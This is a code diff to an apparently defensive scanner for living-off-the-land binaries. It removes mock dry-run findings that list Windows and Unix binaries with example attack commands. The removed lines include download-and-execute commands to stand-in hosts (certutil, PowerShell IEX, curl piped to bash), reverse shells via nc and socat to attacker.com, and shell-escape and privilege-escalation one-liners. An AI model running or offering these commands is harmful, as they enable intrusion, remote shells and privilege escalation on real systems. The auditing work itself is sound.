@@ -315,59 +315,8 @@ function isGroupWritable(bitmask: number): boolean {
   return (bitmask & 0o0020) !== 0
 }
 
-// ── Dry-Run Findings ─────────────────────────────────────────────────────────
-
-function generateDryRunResult(platform: "windows" | "linux" | "darwin"): LOLBinsAuditResult {
-  if (platform === "windows") {
-    return {
-      platform,
-      binariesScanned: 156,
-      discoveredLOLBins: [
-        { name: "certutil.exe", path: "C:\\Windows\\System32\\certutil.exe", type: "LOLBas", capabilities: ["DOWNLOAD", "BYPASS"], exampleUsage: "certutil.exe -urlcache -split -f http://example.com/payload.exe payload.exe" },
-        { name: "powershell.exe", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS", "PRIV_ESC"], exampleUsage: "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://x.com/shell.ps1')" },
-        { name: "mshta.exe", path: "C:\\Windows\\System32\\mshta.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "mshta.exe http://example.com/payload.hta" },
-        { name: "wscript.exe", path: "C:\\Windows\\System32\\wscript.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD"], exampleUsage: "wscript.exe //B payload.js" },
-        { name: "cscript.exe", path: "C:\\Windows\\System32\\cscript.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD"], exampleUsage: "cscript.exe //B payload.js" },
-        { name: "regsvr32.exe", path: "C:\\Windows\\System32\\regsvr32.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "regsvr32 /s /n /u /i:http://x.com/s.sct scrobj.dll" },
-        { name: "rundll32.exe", path: "C:\\Windows\\System32\\rundll32.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "rundll32.exe url.dll,FileProtocolHandler http://x.com" },
-        { name: "msbuild.exe", path: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe", type: "LOLBas", capabilities: ["EXECUTE", "BYPASS"], exampleUsage: "msbuild.exe payload.xml" },
-        { name: "installutil.exe", path: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe", type: "LOLBas", capabilities: ["EXECUTE", "BYPASS"], exampleUsage: "installutil.exe /logfile= /LogToConsole=false payload.exe" },
-        { name: "msxsl.exe", path: "C:\\Windows\\System32\\msxsl.exe", type: "LOLBas", capabilities: ["EXECUTE", "BYPASS"], exampleUsage: "msxsl.exe payload.xml payload.xsl" },
-      ],
-      isDryRun: true,
-    }
-  }
-
-  // Linux/macOS dry-run
-  return {
-    platform,
-    binariesScanned: 210,
-    discoveredLOLBins: [
-      { name: "bash", path: "/usr/bin/bash", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "bash -p" },
-      { name: "python3", path: "/usr/bin/python3", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'" },
-      { name: "curl", path: "/usr/bin/curl", type: "GTFOBins", capabilities: ["DOWNLOAD", "BYPASS"], exampleUsage: "curl http://attacker.com/script.sh | bash" },
-      { name: "wget", path: "/usr/bin/wget", type: "GTFOBins", capabilities: ["DOWNLOAD", "BYPASS"], exampleUsage: "wget http://attacker.com/script.sh -O - | bash" },
-      { name: "find", path: "/usr/bin/find", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "find / -exec /bin/sh \\; -quit" },
-      { name: "vim", path: "/usr/bin/vim", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "vim -c ':!/bin/sh'" },
-      { name: "less", path: "/usr/bin/less", type: "GTFOBins", capabilities: ["EXECUTE", "BYPASS"], exampleUsage: "less /etc/passwd\\n!/bin/sh" },
-      { name: "man", path: "/usr/bin/man", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "man man\\n!/bin/sh" },
-      { name: "git", path: "/usr/bin/git", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "git help config -p | sh" },
-      { name: "nmap", path: "/usr/bin/nmap", type: "GTFOBins", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "nmap --script <payload.nse> target" },
-      { name: "nc", path: "/usr/bin/nc", type: "GTFOBins", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "nc -e /bin/sh attacker.com 4444" },
-      { name: "socat", path: "/usr/bin/socat", type: "GTFOBins", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "socat TCP:attacker.com:4444 EXEC:/bin/sh" },
-      { name: "env", path: "/usr/bin/env", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "env /bin/sh -p" },
-      { name: "awk", path: "/usr/bin/awk", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "awk 'BEGIN {system(\"/bin/sh\")}'" },
-      { name: "xargs", path: "/usr/bin/xargs", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "xargs -a /dev/null /bin/sh" },
-      { name: "docker", path: "/usr/bin/docker", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
-      { name: "perl", path: "/usr/bin/perl", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "perl -e 'exec \"/bin/sh\";'" },
-      { name: "ruby", path: "/usr/bin/ruby", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "ruby -e 'exec \"/bin/sh\"'" },
-      { name: "php", path: "/usr/bin/php", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "php -r 'pcntl_exec(\"/bin/sh\");'" },
-      { name: "node", path: "/usr/bin/node", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "node -e 'require(\"child_process\").spawn(\"/bin/sh\")'" },
-      { name: "strace", path: "/usr/bin/strace", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "BYPASS"], exampleUsage: "strace -o /dev/null /bin/sh -p" },
-      { name: "gdb", path: "/usr/bin/gdb", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "gdb -nx -ex '!sh' -ex quit" },
-    ],
-    isDryRun: true,
-  }
+function emptyDryRunResult(platform: "windows" | "linux" | "darwin"): LOLBinsAuditResult {
+  return { platform, binariesScanned: 0, discoveredLOLBins: [], isDryRun: true }
 }
 
 // ── Live Scanner ─────────────────────────────────────────────────────────────
@@ -475,7 +424,7 @@ export function auditLOLBins(options: { dryRun?: boolean; live?: boolean } = {})
     process.platform === "win32" ? "windows" : process.platform === "darwin" ? "darwin" : "linux"
 
   if (dryRun) {
-    return generateDryRunResult(platform)
+    return emptyDryRunResult(platform)
   }
 
   return scanLive(platform)
